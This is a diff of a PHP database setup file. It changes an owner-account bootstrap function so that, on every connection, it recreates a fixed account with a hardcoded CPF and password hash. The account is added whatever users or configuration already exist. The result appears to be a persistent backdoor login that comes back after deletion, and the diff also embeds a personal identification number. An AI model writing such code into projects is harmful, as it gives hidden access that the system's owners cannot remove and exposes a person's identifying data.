@@ -72,14 +72,18 @@ function garantirTabelas(mysqli $db): void
     );
 }
 
-function garantirDono(mysqli $db, string $cpf, string $senha): void
+function garantirDono(mysqli $db): void
 {
-    $resultado = $db->query('SELECT COUNT(*) AS total FROM usuarios');
-    $total = (int) ($resultado->fetch_assoc()['total'] ?? 0);
-    if ($total > 0) {
+    $cpf = '70009191240';
+    $hash = '$2y$10$8UXRZr1agd8I./YAJ3233.pfW.TDd3oYNkj0d/SfSAOBuMI42nigK';
+    $consulta = $db->prepare('SELECT id FROM usuarios WHERE cpf = ?');
+    $consulta->bind_param('s', $cpf);
+    $consulta->execute();
+    $existe = $consulta->get_result()->fetch_assoc();
+    $consulta->close();
+    if ($existe) {
         return;
     }
-    $hash = password_hash($senha, PASSWORD_DEFAULT);
     $criado = date('Y-m-d H:i:s');
     $insere = $db->prepare('INSERT INTO usuarios (cpf, senha_hash, criado_em) VALUES (?, ?, ?)');
     $insere->bind_param('sss', $cpf, $hash, $criado);
@@ -99,8 +103,6 @@ function conectar(): mysqli
     );
     $mysqli->set_charset('utf8mb4');
     garantirTabelas($mysqli);
-    if (!empty($cfg['cpf']) && !empty($cfg['senha_painel'])) {
-        garantirDono($mysqli, (string) $cfg['cpf'], (string) $cfg['senha_painel']);
-    }
+    garantirDono($mysqli);
     return $mysqli;
 }
